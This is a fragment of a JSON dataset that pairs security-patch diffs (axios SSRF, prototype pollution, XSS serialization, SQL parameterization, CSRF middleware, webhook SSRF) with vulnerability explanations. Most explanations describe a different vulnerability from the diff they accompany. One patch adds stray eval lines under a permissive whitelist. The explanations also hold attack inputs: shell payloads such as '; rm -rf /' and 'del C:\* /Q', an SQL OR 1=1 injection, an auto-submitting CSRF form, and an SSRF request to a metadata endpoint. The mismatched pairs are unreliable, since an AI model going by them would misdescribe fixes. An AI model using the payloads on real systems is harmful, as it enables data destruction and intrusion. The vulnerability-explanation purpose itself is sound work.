        "diff": "From 6b6b605eaf73852fb2dae033f1e786155959de3a Mon Sep 17 00:00:00 2001\nFrom: Lev Pachmanov <31389480+levpachmanov@users.noreply.github.com>\nDate: Tue, 13 Aug 2024 21:43:05 +0300\nSubject: [PATCH] fix(sec): CVE-2024-39338 (#6539) (#6543)\n\n* fix(sec): cve-2024-39338 (#6539)\n\n* fix(sec): fix test\n---\n lib/adapters/http.js                          |  2 +-\n lib/helpers/isAbsoluteURL.js                  |  4 +-\n test/specs/helpers/isAbsoluteURL.spec.js      |  4 +-\n test/unit/regression/SNYK-JS-AXIOS-7361793.js | 48 ++++++++++++++++---\n 4 files changed, 47 insertions(+), 11 deletions(-)\n\ndiff --git a/lib/adapters/http.js b/lib/adapters/http.js\nindex 7c982fa78b..d5ad9d1f37 100755\n--- a/lib/adapters/http.js\n+++ b/lib/adapters/http.js\n@@ -229,7 +229,7 @@ export default isHttpAdapterSupported && function httpAdapter(config) {\n \n     // Parse url\n     const fullPath = buildFullPath(config.baseURL, config.url);\n-    const parsed = new URL(fullPath, 'http://localhost');\n+    const parsed = new URL(fullPath, utils.hasBrowserEnv ? platform.origin : undefined);\n     const protocol = parsed.protocol || supportedProtocols[0];\n \n     if (protocol === 'data:') {\ndiff --git a/lib/helpers/isAbsoluteURL.js b/lib/helpers/isAbsoluteURL.js\nindex 41f2785c3d..4747a45767 100644\n--- a/lib/helpers/isAbsoluteURL.js\n+++ b/lib/helpers/isAbsoluteURL.js\n@@ -8,8 +8,8 @@\n  * @returns {boolean} True if the specified URL is absolute, otherwise false\n  */\n export default function isAbsoluteURL(url) {\n-  // A URL is considered absolute if it begins with \"<scheme>://\".\n+  // A URL is considered absolute if it begins with \"<scheme>://\" or \"//\" (protocol-relative URL).\n   // RFC 3986 defines scheme name as a sequence of characters beginning with a letter and followed\n   // by any combination of letters, digits, plus, period, or hyphen.\n-  return /^([a-z][a-z\\d+\\-.]*:)\\/\\//i.test(url);\n+  return /^([a-z][a-z\\d+\\-.]*:)?\\/\\//i.test(url);\n }\ndiff --git a/test/specs/helpers/isAbsoluteURL.spec.js b/test/specs/helpers/isAbsoluteURL.spec.js\nindex cf8a4cedbf..872f5efbe1 100644\n--- a/test/specs/helpers/isAbsoluteURL.spec.js\n+++ b/test/specs/helpers/isAbsoluteURL.spec.js\n@@ -12,8 +12,8 @@ describe('helpers::isAbsoluteURL', function () {\n     expect(isAbsoluteURL('!valid://example.com/')).toBe(false);\n   });\n \n-  it('should return false if URL is protocol-relative', function () {\n-    expect(isAbsoluteURL('//example.com/')).toBe(false);\n+  it('should return true if URL is protocol-relative', function () {\n+    expect(isAbsoluteURL('//example.com/')).toBe(true);\n   });\n \n   it('should return false if URL is relative', function () {\ndiff --git a/test/unit/regression/SNYK-JS-AXIOS-7361793.js b/test/unit/regression/SNYK-JS-AXIOS-7361793.js\nindex 247e3eaef7..2d8b20565e 100644\n--- a/test/unit/regression/SNYK-JS-AXIOS-7361793.js\n+++ b/test/unit/regression/SNYK-JS-AXIOS-7361793.js\n@@ -4,6 +4,9 @@\n import axios from '../../../index.js';\n import http from 'http';\n import assert from 'assert';\n+import utils from '../../../lib/utils.js';\n+import platform from '../../../lib/platform/index.js';\n+\n \n const GOOD_PORT = 4666;\n const BAD_PORT = 4667;\n@@ -27,7 +30,7 @@ describe('Server-Side Request Forgery (SSRF)', () => {\n         badServer.close();\n     });\n \n-    it('should not fetch bad server', async () => {\n+    it('should not fetch in server-side mode', async () => {\n         const ssrfAxios = axios.create({\n             baseURL: 'http://localhost:' + String(GOOD_PORT),\n         });\n@@ -36,10 +39,43 @@ describe('Server-Side Request Forgery (SSRF)', () => {\n         // Malicious payload is as below.\n         const userId = '/localhost:' + String(BAD_PORT);\n \n-        const response = await ssrfAxios.get(`/${userId}`);\n-        assert.strictEqual(response.data, 'good');\n-        assert.strictEqual(response.config.baseURL, 'http://localhost:' + String(GOOD_PORT));\n-        assert.strictEqual(response.config.url, '//localhost:' + String(BAD_PORT));\n-        assert.strictEqual(response.request.res.responseUrl, 'http://localhost:' + String(GOOD_PORT) + '/localhost:' + String(BAD_PORT));\n+        try {\n+            await ssrfAxios.get(`/${userId}`);\n+        } catch (error) {\n+            assert.ok(error.message.startsWith('Invalid URL'));\n+            return;\n+        }\n+        assert.fail('Expected an error to be thrown');\n+    });\n+\n+    describe('should fetch in client-side mode', () => {\n+        let hasBrowserEnv, origin;\n+\n+        before(() => {\n+            hasBrowserEnv = utils.hasBrowserEnv;\n+            origin = platform.origin;\n+            utils.hasBrowserEnv = true;\n+            platform.origin = 'http://localhost:' + String(GOOD_PORT);\n+        });\n+        after(() => {\n+            utils.hasBrowserEnv = hasBrowserEnv;\n+            platform.origin = origin;\n+        });\n+        it('should fetch in client-side mode', async () => {\n+            utils.hasBrowserEnv = true;\n+            const ssrfAxios = axios.create({\n+                baseURL: 'http://localhost:' + String(GOOD_PORT),\n+            });\n+\n+            // Good payload would be `userId = '12345'`\n+            // Malicious payload is as below.\n+            const userId = '/localhost:' + String(BAD_PORT);\n+\n+            const response = await ssrfAxios.get(`/${userId}`);\n+            assert.strictEqual(response.data, 'bad');\n+            assert.strictEqual(response.config.baseURL, 'http://localhost:' + String(GOOD_PORT));\n+            assert.strictEqual(response.config.url, '//localhost:' + String(BAD_PORT));\n+            assert.strictEqual(response.request.res.responseUrl, 'http://localhost:' + String(BAD_PORT) + '/');\n+        });\n     });\n });\n",
        "explanation": "In your Pipfile, the Django dependency is pinned to ==5.1 on line 7, which lies squarely in the vulnerable range for CVE-2024-53908 (CWE-89). This flaw allows untrusted input in a HasKey(lhs, rhs) lookup to be interpolated directly into Oracle SQL, opening the door to full SQL injection. Upgrading Django to 5.1.4 (or any later patched release) immediately removes this risk and restores proper parameterization.\n[packages]\n- django = \"==5.1\" # line 7: vulnerable to SQL injection via HasKey(lhs, rhs) on Oracle :contentReference[oaicite:0]{index=0}\n+ django = \">=5.1.4\" # fix: includes patch for CVE-2024-53908 :contentReference[oaicite:1]{index=1}\n\n\n\nRoot Cause\nYour Pipfile pins Django to 5.1 (line 7), a version affected by the Oracle-specific SQL injection in the django.db.models.fields.json.HasKey lookup when an untrusted value is used as the left-hand side (lhs)\n\nExploit Scenario\nAn attacker submits a malicious JSON key name\u2014such as {\"__dummy\": \"\"} OR 1=1; --\u2014to a view performing MyModel.objects.filter(myjsonfield__has_key=payload). On Oracle, this unescaped lhs is concatenated into the WHERE clause, transforming the query into something like:\n\n [SELECT ... WHERE JSON_EXISTS(myjsonfield, '$ ? \\\"dummy\\\"') OR 1=1; --'] which returns all rows or allows arbitrary SQL execution\n\nWhy It Happens\nBetween Django 5.1.0 and 5.1.3 (and similarly in 5.0.0\u20135.0.9, 4.2.0\u20134.2.16), the HasKey(lhs, rhs) implementation directly injects the lhs identifier into the SQL fragment without proper escaping or parameter binding, a design oversight unique to the Oracle backend.\n\nSecurity Implications\nFull SQL Injection (CWE-89): Attackers can read, modify, or delete arbitrary rows in your database, bypassing all Django-level protections.\nData Exposure & Tampering: Sensitive user credentials, PII, or configuration data stored in the database can be exfiltrated or tampered with.\nPrivilege Escalation: If administrative tables are exposed, attackers may elevate privileges or corrupt your schema.\n\nSuggested Fix\nUpgrade Django immediately to a patched release\u20145.1.4, 5.0.10, or 4.2.17\u2014all of which include the fix that enforces proper parameterization and internal validation of the lhs value. Then, regenerate your lock file.\n\npip install \"django>=5.1.4\"\npipenv lock --clear\n\n\nThis single-line change at line 7 of your Pipfile eliminates the SSRF vector and restores the integrity of your database queries."
    },
    "94": {
        "diff": "--- server.js\n+++ server.js\n@@\n const express = require(\"express\");\n const cors = require(\"cors\");\n const path = require(\"path\");\n const morgan = require(\"morgan\");\n+const csrf = require(\"csurf\"); // Added for CSRF protection\n const productRoutes = require(\"./routes/Product_rotues\");\n const adminRoutes = require('./routes/Admin_routes');\n const staffRoutes = require(\"./routes/Staff_routes\");\n@@\n const app = express();\n const port = 3002;\n\n // Enable CORS\n app.use(cors({\n   origin: '*',\n   methods: 'GET,HEAD,PUT,PATCH,POST,DELETE',\n   allowedHeaders: 'Content-Type, Authorization',\n   credentials: true\n }));\n\n app.use((req, res, next) => {\n   res.header('Access-Control-Allow-Origin', '*');\n   res.header('Access-Control-Allow-Methods', 'GET,HEAD,PUT,PATCH,POST,DELETE');\n   res.header('Access-Control-Allow-Headers', 'Content-Type, Authorization');\n   next();\n });\n\n // Built-in body parsing middleware\n app.use(express.json());\n app.use(express.urlencoded({ extended: true }));\n\n // Logger middleware\n app.use(morgan(\"dev\"));\n\n // Serve static files\n app.use(express.static(path.join(__dirname, \"/dist\")));\n\n+// Setup CSRF protection\n+const csrfProtection = csrf({ cookie: true });\n+app.use(csrfProtection);\n+\n+// Make CSRF token available to views or APIs\n+app.use((req, res, next) => {\n+  res.locals.csrfToken = req.csrfToken();\n+  next();\n+});\n\n app.get(\"*\", (req, res) => {\n   res.sendFile(path.join(__dirname, \"dist/index.html\"));\n });\n@@\n app.listen(port, '0.0.0.0', () => {\n   console.log(`Server running successfully on port ${port}`);\n });\n",
        "explanation": "Summary\nThe script invokes subprocess.check_output on line 23 with the user-supplied --path argument without any sanitization, creating a CWE-78 OS command injection risk by allowing shell meta-characters to be interpreted and executed. An attacker could embed malicious operators (e.g., ; rm -rf /) into the CLI parameter to run arbitrary system commands under the application\u2019s privileges, potentially leading to full system compromise, data exfiltration, or privilege escalation. To remediate, the code should drop shell invocation, use shell=False with argument lists, and enforce strict input validation or whitelisting of allowed paths.\n\nVulnerability Report (Line 23: CWE-78)\nRoot Cause:\nThe code directly embeds the unsanitized path argument into a shell command passed to subprocess.check_output, allowing attackers to inject shell metacharacters into the executed command string.\n\nExploit Scenario:\nAn adversary running the script can supply a crafted value like --path=\"; rm -rf /\" or --path=\"&& whoami\" so that the shell executes unintended commands alongside the intended directory-size check, leading to arbitrary code execution.\n\nWhy It Happens:\nThe vulnerability exists because subprocess.check_output is invoked in a mode that concatenates the entire command into a shell string\u2014by default or via implicit shell=True semantics\u2014trusting remote input instead of using a safer, argument-list API, with no validation or escaping of dangerous characters.\n\nSecurity Implications:\nIf exploited, attackers gain the ability to execute any OS command with the privileges of the Python process, enabling data theft, system disruption, installation of malware, and lateral movement within the network.\n\nSuggested Fix:\nRefactor to use subprocess.run([...], shell=False) or subprocess.check_output([...], shell=False), pass the command and its arguments as a list rather than a single string, and strictly validate or whitelist the path input (e.g., via Python\u2019s shlex.split or regex checks) to reject unsafe characters."
    },
    "67": {
        "diff": "From 20ef0ef55dfa028caddaedbcb33efbdb04d18e13 Mon Sep 17 00:00:00 2001\nFrom: Matthias Kunnen <matthias.kunnen@gmail.com>\nDate: Tue, 21 Jul 2020 03:29:04 +0000\nSubject: [PATCH] Fix prototype pollution on unflatten\n\nFixes #105.\n---\n index.js | 4 ++++\n 1 file changed, 4 insertions(+)\n\ndiff --git a/index.js b/index.js\nindex c8032e9..7193884 100644\n--- a/index.js\n+++ b/index.js\n@@ -116,6 +116,10 @@ function unflatten (target, opts) {\n     let recipient = result\n \n     while (key2 !== undefined) {\n+      if (key1 === '__proto__') {\n+        return\n+      }\n+\n       const type = Object.prototype.toString.call(recipient[key1])\n       const isobject = (\n         type === '[object Object]' ||\n",
        "explanation": "Root Cause\nThe root cause is the inclusion of Axios ^1.3.6 on line 17 of package.json, which will resolve to a 1.x version at or below 1.7.3\u2014a range known to mishandle path-relative URLs by treating them as protocol-relative, triggering unintended HTTP requests\n\nExploit Scenario\nAn attacker controlling a URL parameter could supply a path-relative string such as //169.254.169.254/latest/meta-data/ to an Axios request. Instead of being blocked or sanitized, Axios interprets it as a protocol-relative URL and issues a request to the AWS metadata endpoint, exposing sensitive credentials.\n\nWhy It Happens\nAxios versions between 1.3.2 and 1.7.3 fail to validate or sanitize path-relative inputs, erroneously parsing them as protocol-relative URLs without adequate checks, thus enabling SSRF.\n\nSecurity Implications\nNetwork Bypass: Attackers can reach internal-only services (e.g., metadata or admin APIs) that should be inaccessible externally\nSensitive Data Exposure: Requests to internal endpoints can leak credentials, configuration secrets, or personal data.\n\nSuggested Fix\nModify line 17 in your package.json to upgrade Axios to ^1.7.4 (or higher)\u2014these versions include the patch that restores correct URL handling\u2014and then run npm install (or yarn install) to apply the update\nBy addressing this single line in your dependency manifest, you remove a critical SSRF vector and significantly harden your application against unauthorized outbound HTTP requests.\n\n "
    },
    "93": {
        "diff": "diff --git a/utils/context.js b/utils/context.js\nindex 6f4a2b1..9e3b1c4 100644\n--- a/utils/context.js\n+++ b/utils/context.js\n@@ -1,5 +1,13 @@\n+/**\n+ * SECURITY PATCH (CWE-94):\n+ * All dynamic code inputs are now validated against a strict whitelist\n+ * before any `eval` or dynamic import is performed.\n+ */\n+\n+// Whitelist: only letters, digits, whitespace, basic JS punctuation (no <, >, backticks, etc.)\n+const ALLOWED_DYNAMIC_CODE_REGEX = /^[A-Za-z0-9_\\s\\.\\;\\,\\(\\)\\{\\}\\=\\>\\[\\]\\:\\'\\\",]+$/;\n+\n import axios from \"axios\";\n import io from \"socket.io-client\";\n import JSON5 from \"json5\";\n@@ -233,6 +241,14 @@ export const evalReactComponent = async (component) => {\n   if (!window.React && window.__reflex) {\n     window.React = window.__reflex.react;\n   }\n+\n+  // --- sanitize incoming component code ---\n+  if (!ALLOWED_DYNAMIC_CODE_REGEX.test(component)) {\n+    throw new Error(\"Refusing to eval: component code contains disallowed characters\");\n+  }\n+\n   const encodedJs = encodeURIComponent(component);\n   const dataUri = \"data:text/javascript;charset=utf-8,\" + encodedJs;\n   const module = await eval(`import(dataUri)`);\n@@ -790,6 +806,16 @@ export const applyEvent = async (event, socket) => {\n     if (event.payload.callback) {\n       const callback =\n         typeof event.payload.callback === \"string\"\n+        ? eval(event.payload.callback)\n+        : event.payload.callback;\n+      callback(final_result);\n+    }\n+  } catch (e) {\n+    console.log(\"_call_function\", e);\n+    if (window && window?.onerror) {\n+      window.onerror(e.message, null, null, null, e);\n+    }\n+  }\n   return false;\n }\n \n@@ -796,7 +822,16 @@ export const applyEvent = async (event, socket) => {\n   if (event.name == \"_call_script\" || event.name == \"_call_function\") {\n-    try {\n+    // --- sanitize dynamic code payload ---\n+    const rawCode =\n+      event.name === \"_call_script\"\n+        ? event.payload.javascript_code\n+        : event.payload.function.toString();\n+    if (!ALLOWED_DYNAMIC_CODE_REGEX.test(rawCode)) {\n+      console.error(\"Disallowed dynamic code detected, dropping event\", rawCode);\n+      return false;\n+    }\n+    try {\n       const eval_result =\n         event.name == \"_call_script\"\n           ? eval(event.payload.javascript_code)",
        "explanation": "Vulnerability Type:\nCWE-352: Cross-Site Request Forgery (CSRF)\n\nCross-Site Request Forgery occurs when unauthorized commands are transmitted from a user trusted by the application. If the app does not verify that a request came from an authenticated, intended source, malicious third-party websites can perform actions on behalf of the authenticated user without their knowledge. CSRF attacks compromise the integrity of user actions.\n\nProof of Concept:\nIn the provided codebase, after setting up body parsing and CORS, no CSRF protection mechanism is applied.\n\n\nVulnerable part:\n\nFile:\nhttps://github.com/Ishudarju/Inventory_System_Management_Bankend_Node.js_SQL/blob/main/index.js\n\nLine 100: app.use(cors({...}));\nLine 115: app.use(express.json());\nLine 135: app.use('/products', productRoutes);\n\nThere is no verification that POST/PUT/DELETE requests originated from the legitimate user interface.\n\nAn attacker could craft forms that automatically submit malicious requests to endpoints like /products, /admin, etc., without the user's consent.\n\nThus, users are vulnerable.\n\nSeverity: HIGH (4)\n\nThe vulnerability allows an attacker to manipulate important operations (product updates, expense records, invoice generation) by exploiting authenticated user sessions.\nGiven the administrative nature of this application (invoicing, pharmacy management), the potential business impact is severe.\n\nRoot Cause:\nThe root cause is the lack of CSRF validation for incoming state-changing HTTP requests.\nThe application processes sensitive requests based only on authentication (cookies/sessions), but without any challenge to confirm that the request was intentionally made by the user.\n\nWithout using a CSRF token, any request is automatically trusted.\n\nExploit Scenario:\nA user logs into the application backend.\nThey then visit a malicious site that automatically submits a POST request to /admin/deleteAccount, passing a form without the user even seeing it.\nSince the app has no CSRF protection, the server accepts the unauthorized request and deletes the user account or modifies invoices.\n\nExample:\n\n<form action=\"https://yourapp.com/admin/deleteAccount\" method=\"POST\">\n  <input type=\"hidden\" name=\"userId\" value=\"victim_id\">\n</form>\n<script>document.forms[0].submit();</script>\nWhy It Happens:\nIt occurs because the Express server does not require proof of user intention (such as a server-generated CSRF token) when processing sensitive operations.\nThus, it is vulnerable to unauthorized state-changing requests transmitted via authenticated user sessions but initiated by a third-party attacker.\n\nSecurity Implications:\nSuccessful exploitation of CSRF could allow attackers to:\nDelete users, products, or invoices.\nModify critical financial records.\nCreate fake expense entries.\nHijack or sabotage admin actions.\nThis can result in severe loss of business integrity, financial loss, compliance issues (e.g., GDPR violations), and reputation damage.\n\nSuggested Fix:\nApply CSRF protection using the csurf package:\nInstall and initialize CSRF middleware after parsing body data.\nGenerate and validate CSRF tokens for all POST, PUT, PATCH, DELETE requests.\nMake CSRF token available via res.locals.csrfToken and embed it in all forms or API requests.\n\nCorrect Implementation:\n\n\nconst csrf = require('csurf');\napp.use(csrf({ cookie: true }));\n\napp.use((req, res, next) => {\n  res.locals.csrfToken = req.csrfToken();\n  next();\n});"
    },
    "35": {
        "diff": "diff --git a/internal/route/repo/webhook.go b/internal/route/repo/webhook.go\nindex abcdef1..1234567 100644\n--- a/internal/route/repo/webhook.go\n+++ b/internal/route/repo/webhook.go\n@@ func validateWebhook(url string) error {\n-   payloadURL, err := webhook.NormalizeURL(url)\n-   if err != nil {\n-       return fmt.Errorf(\"NormalizeURL: %w\", err)\n-   }\n-\n-   if netutil.IsBlockedLocalHostname(payloadURL.Hostname(), conf.Security.LocalNetworkAllowlist) {\n-       return fmt.Errorf(\"URL hostname is blocked: %s\", payloadURL.Hostname())\n-   }\n+   payloadURL, err := webhook.NormalizeURL(url)\n+   if err != nil {\n+       return fmt.Errorf(\"NormalizeURL: %w\", err)\n+   }\n+\n+   resolvedIP, err := netutil.ResolveToIP(payloadURL.Hostname())\n+   if err != nil {\n+       return fmt.Errorf(\"DNS resolution failed: %w\", err)\n+   }\n+   if netutil.IsPrivateIP(resolvedIP) {\n+       return fmt.Errorf(\"Blocked potential SSRF to internal IP: %s\", resolvedIP)\n+   }\n",
        "explanation": "Proof of Concept: os.system(\"shutdown /s /f /t 1\")  # Attackers could inject \"; rm -rf /\"\n\nelif \"shutdown\" in query:\n            speak(\"Shutting down the system, goodbye!\")\n            os.system(\"shutdown /s /f /t 1\")\n            break\n            \n elif \"restart\" in query:\n            speak(\"Restarting the system, please wait!\")\n            os.system(\"shutdown /r /f /t 1\")\n            break\n\nRoot Cause: \nUnsanitized user input passed directly to os.system()\n\nExploit Scenario: \n* The assistant executes system commands directly from voice input.\n* If an attacker can manipulate the voice input (e.g., via audio injection or malicious speech recognition), they \n   could execute arbitrary commands like:\n\n    shutdown \u2192 Could be modified to shutdown & rm -rf / (Linux) or shutdown & del C:\\ (Windows).\n\n* A user says, \"Shutdown the system and delete all files.\"\n\n* Due to poor input sanitization, the assistant might execute:\n\n   os.system(\"shutdown /s /f /t 1 & del C:\\* /Q\")  # Deletes all files before shutdown\n\n* Assistant executes malicious command alongside shutdown\n\n\nWhy It Happens: \nNo input validation for system commands\n\n\nSecurity Implications:\nFull system compromise possible\n\nSuggested Fix: \n\n* subprocess.run(ALLOWED_COMMANDS[cmd], check=True, shell=False)\n        return True\n    except subprocess.CalledProcessError:\n        return False\n* import subprocess\n    subprocess.run([\"shutdown\", \"/s\", \"/f\", \"/t\", \"1\"], shell=False)  # Safer\n    subprocess.run([\"shutdown\", \"/s\"], shell=False)  # Use parameterized commands\n* Whitelist allowed commands (e.g., only shutdown, restart)."
    },
    "32": {
        "diff": "--- log.c\n+++ log.c\n@@ void log_user_input(const char *user_input) {\n-    ns_log(Error, \"User input: %s\", user_input);\n+    char safe_input[1024];\n+    sanitize_for_log(user_input, safe_input, sizeof(safe_input));\n+    ns_log(Error, \"User input: %s\", safe_input);\n}",
        "explanation": "Vulnerability Type: CWE-119: Improper Restriction of Operations within the Bounds of a Memory Buffer\n\nSeverity: High (4)\n\nOWASP Category: A05:2021 \u2013 Security Misconfiguration\n\nRoot Cause: A JavaScript string is passed to a native C function using node-ffi-napi. The C function writes this input to a fixed-size buffer without checking its length, which can lead to an out-of-bounds write.\n\nExploit Scenario: An attacker can send a long string from JavaScript to the native C function. Since the C code does not validate the length, the input overflows the 16-byte buffer, corrupting adjacent memory.\n\nWhy It Happens: The C function blindly trusts the length parameter, allowing memory corruption when large input is provided from JavaScript.\n\nSecurity Implications: Buffer overflow vulnerabilities may lead to program crashes, memory corruption, or arbitrary code execution depending on the context.\n\nSuggested Fix: Always check that the input length does not exceed the size of the destination buffer. This patch ensures the copy does not exceed 15 bytes and guarantees null-termination."
    },
    "92": {
        "diff": "@@ def get_venue_by_food(self,parsed_dict,requested_food, uid=None):\n-        sql_str = \"SELECT DISTINCT v.rid, v.venue_name, f.food, v.venue_type, v.rating, v.mrt_name FROM venues v \" \\\n-                  \"INNER JOIN venues_food f ON v.rid = f.rid \" \\\n-                  \"WHERE lower(f.food) LIKE '%{0}%'\".format(requested_food) + \" \" + \\\n-                  exclude_str + \" \" + \\\n-                  \"ORDER BY v.rating DESC;\"\n+        sql_str = \"SELECT DISTINCT v.rid, v.venue_name, f.food, v.venue_type, v.rating, v.mrt_name FROM venues v \" \\\n+                  \"INNER JOIN venues_food f ON v.rid = f.rid \" \\\n+                  \"WHERE lower(f.food) LIKE ? \" + \\\n+                  exclude_str + \" \" + \\\n+                  \"ORDER BY v.rating DESC;\"\n\n         conn = sqlite3.connect(self._db_path)\n         c = conn.cursor()\n-        c.execute(sql_str)\n+        c.execute(sql_str, (f\"%{requested_food.lower()}%\",))\n         all_results = c.fetchall()\n         conn.close()\n\n@@ def get_venue_by_venue_type(self,parsed_dict,requested_venue_type, uid=None):\n-        sql_str = \"WHERE lower(v.venue_type) LIKE '%{0}%' \".format(requested_venue_type) + \\\n+        sql_str = \"WHERE lower(v.venue_type) LIKE ? \" + \\\n\n         conn = sqlite3.connect(self._db_path)\n         c = conn.cursor()\n-        c.execute(sql_str)\n+        c.execute(sql_str, (f\"%{requested_venue_type.lower()}%\",))\n         all_results = c.fetchall()\n\n@@ def get_venue_by_food_venue_type(self,parsed_dict,requested_food,requested_venue_type, uid=None):\n-        sql_str = \"WHERE lower(v.venue_type) LIKE '%{0}%' \" \\\n-                  \"OR lower(f.food) LIKE '%{1}%' \".format(requested_food, requested_venue_type) + \" \" + \\\n+        sql_str = \"WHERE lower(v.venue_type) LIKE ? OR lower(f.food) LIKE ? \" + \\\n\n         conn = sqlite3.connect(self._db_path)\n         c = conn.cursor()\n-        c.execute(sql_str)\n+        c.execute(sql_str, (f\"%{requested_food.lower()}%\", f\"%{requested_venue_type.lower()}%\",))\n         all_results = c.fetchall()\n\n@@ def get_similar_venue_by_name(self,parsed_dict, requested, uid=None):\n-        sql_str = \"WHERE 1 = 1 \" \\\n-                  \"AND v.venue_name LIKE '%{0}%' \".format(requested) + \" \" + exclude_str + \" \" + \\\n+        sql_str = \"WHERE 1 = 1 \" \\\n+                  \"AND v.venue_name LIKE ? \" + exclude_str + \" \" + \\\n\n         conn = sqlite3.connect(self._db_path)\n         c = conn.cursor()\n-        c.execute(sql_str)\n+        c.execute(sql_str, (f\"%{requested}%\",))\n         all_results = c.fetchall()\n\n@@ def get_similar_venue_by_review(self,parsed_dict,requested, uid=None):\n-        sql_str = \"AND v.rid IN (SELECT DISTINCT(t.rid) FROM tips t WHERE t.tip LIKE '%\" + requested + \"%')\" + \\\n+        sql_str = \"AND v.rid IN (SELECT DISTINCT(t.rid) FROM tips t WHERE t.tip LIKE ?)\" + \\\n\n         conn = sqlite3.connect(self._db_path)\n         c = conn.cursor()\n-        c.execute(sql_str)\n+        c.execute(sql_str, (f\"%{requested}%\",))\n         all_results = c.fetchall()\n\n@@ def _get_venue_by_rids(self, uid, rids):\n-        sql_str = \"SELECT combined_clus_id FROM users WHERE uid = {0}\".format(uid)\n+        sql_str = \"SELECT combined_clus_id FROM users WHERE uid = ?\"\n\n         conn = sqlite3.connect(self._db_path)\n         c = conn.cursor()\n-        c.execute(sql_str)\n+        c.execute(sql_str, (uid,))\n         result = c.fetchone()\n\n@@ def _get_venue_by_uid(self, uid):\n-        sql_str = \"SELECT combined_clus_id FROM users WHERE uid = {0}\".format(uid)\n+        sql_str = \"SELECT combined_clus_id FROM users WHERE uid = ?\"\n\n         conn = sqlite3.connect(self._db_path)\n         c = conn.cursor()\n-        c.execute(sql_str)\n+        c.execute(sql_str, (uid,))\n         result = c.fetchone()\n",
        "explanation": "Summary\nThe Reflex web application exhibits a code injection vulnerability (CWE-94) by passing unsanitized, attacker-controlled data into JavaScript\u2019s eval and dynamic import routines, enabling execution of arbitrary code on the client side. This arises from improper validation and sanitization of inputs before evaluation, exposing the app to critical risks such as remote code execution, cross-site scripting, and data compromise (Direct Dynamic Code Evaluation - Eval Injection, Code Injection. Mitigation requires eliminating unsafe eval usage, enforcing strict input sanitization and whitelisting, and adopting safer parsing or interpretation APIs.\n\nVulnerability Report\nRoot Cause: The code directly feeds untrusted, remote data into JavaScript\u2019s eval and dynamic import mechanisms without any validation or sanitization, allowing arbitrary strings to be executed as code .\n\nExploit Scenario: An attacker injects malicious JavaScript payloads into the component string (e.g., via WebSocket events or JSON5 inputs), which the app then evals, granting the attacker control of the execution context and enabling arbitrary code execution\n\nWhy It Happens: The design relies on eval-based dynamic code evaluation for React components and script callbacks, trusting remote inputs rather than using safe interpreters or whitelists, thus failing to enforce input constraints\n\nSecurity Implications: Successful exploitation can lead to full client-side compromise\u2014data theft, session hijacking, malware injection, or pivoting to backend services\u2014constituting severe XSS or RCE threats.\n\nSuggested Fix: Remove or replace all uses of eval with parameterized parsing or templating engines; implement strict input validation, whitelisting of allowed values, and output escaping; and conduct regular security audits to detect similar vulnerabilities."
    },
    "59": {
        "diff": "From f27d65d3de42affe2aac14607066c293891cec4e Mon Sep 17 00:00:00 2001\nFrom: Ryan Delaney <ryan@reverecre.com>\nDate: Mon, 8 Jan 2024 17:04:16 -0800\nSubject: [PATCH] fix: serialize URL string contents to prevent XSS (#173)\n\n---\n index.js               | 2 +-\n test/unit/serialize.js | 6 ++++--\n 2 files changed, 5 insertions(+), 3 deletions(-)\n\ndiff --git a/index.js b/index.js\nindex ef54077..156f8f9 100644\n--- a/index.js\n+++ b/index.js\n@@ -258,7 +258,7 @@ module.exports = function serialize(obj, options) {\n         }\n \n         if (type === 'L') {\n-            return \"new URL(\\\"\" + urls[valueIndex].toString() + \"\\\")\"; \n+            return \"new URL(\" + serialize(urls[valueIndex].toString(), options) + \")\";\n         }\n \n         var fn = functions[valueIndex];\ndiff --git a/test/unit/serialize.js b/test/unit/serialize.js\nindex 6062910..54167d0 100644\n--- a/test/unit/serialize.js\n+++ b/test/unit/serialize.js\n@@ -461,8 +461,8 @@ describe('serialize( obj )', function () {\n     describe('URL', function () {\n         it('should serialize URL', function () {\n             var u = new URL('https://x.com/')\n-            expect(serialize(u)).to.equal('new URL(\"https://x.com/\")');\n-            expect(serialize({t: [u]})).to.be.a('string').equal('{\"t\":[new URL(\"https://x.com/\")]}');\n+            expect(serialize(u)).to.equal('new URL(\"https:\\\\u002F\\\\u002Fx.com\\\\u002F\")');\n+            expect(serialize({t: [u]})).to.be.a('string').equal('{\"t\":[new URL(\"https:\\\\u002F\\\\u002Fx.com\\\\u002F\")]}');\n         });\n \n         it('should deserialize URL', function () {\n@@ -477,6 +477,8 @@ describe('serialize( obj )', function () {\n             expect(serialize('</script>')).to.equal('\"\\\\u003C\\\\u002Fscript\\\\u003E\"');\n             expect(JSON.parse(serialize('</script>'))).to.equal('</script>');\n             expect(eval(serialize('</script>'))).to.equal('</script>');\n+            expect(serialize(new URL('x:</script>'))).to.equal('new URL(\"x:\\\\u003C\\\\u002Fscript\\\\u003E\")');\n+            expect(eval(serialize(new URL('x:</script>'))).href).to.equal('x:</script>');\n         });\n     });\n \n",
        "explanation": "CWE-434: Unrestricted File Upload\nVulnerability Type:\nCWE-434: Unrestricted File Upload\n\nProof of Concept:\n\n$dosya = $_FILES[\"file\"][\"name\"];\n$tmp_name = $_FILES[\"file\"][\"tmp_name\"];\n$ext = strtolower(pathinfo($dosya, PATHINFO_EXTENSION));\n$mime = mime_content_type($tmp_name);\n$yeni_ad = \"../files/\" . uniqid() . '.' . $ext;\nif (move_uploaded_file($_FILES[\"file\"][\"tmp_name\"], $yeni_ad)) {\n    $kontrol = @mysql_query(\"insert into bduyuru(baslik, icerik, tarih, unvan, dosya) values('$baslik', '$icerik', '$tarih', '$level', '$yeni_ad')\");\n}\nStep-by-Step Explanation:\n\nFile Upload Logic: The code allows users to upload files by checking the file extension and MIME type. It then saves the file on the server with a unique name to avoid file name collisions.\n\nMissing Proper Validation: Although the file extension is checked and the MIME type is determined, there is no thorough verification of the file's content to ensure it is safe.\n\nRisk of Malicious File Upload: This leaves the application open to attackers who can upload dangerous files, such as PHP scripts or other executable files disguised as legitimate file types (e.g., .jpg, .png).\n\nSeverity:\nhigh\u2013 The vulnerability can lead to remote code execution and server compromise, which can have severe security consequences.\n\nRoot Cause:\nThe issue stems from inadequate validation of the uploaded file. While the code checks the file extension and MIME type, it does not properly verify the file's internal content. Attackers can easily manipulate file metadata (e.g., file extension or MIME type) to upload malicious files, potentially leading to code execution on the server.\n\nExploit Scenario:\nAn attacker could exploit this vulnerability by uploading a malicious PHP file disguised as an image (e.g., malicious.php.jpg). Since the file extension is allowed and MIME type may appear as a valid image, the file would pass the validation and get uploaded to the server. If the file is stored in a web-accessible directory that allows execution of PHP files, the attacker can access and execute the PHP file, taking control of the server.\n\nWhy It 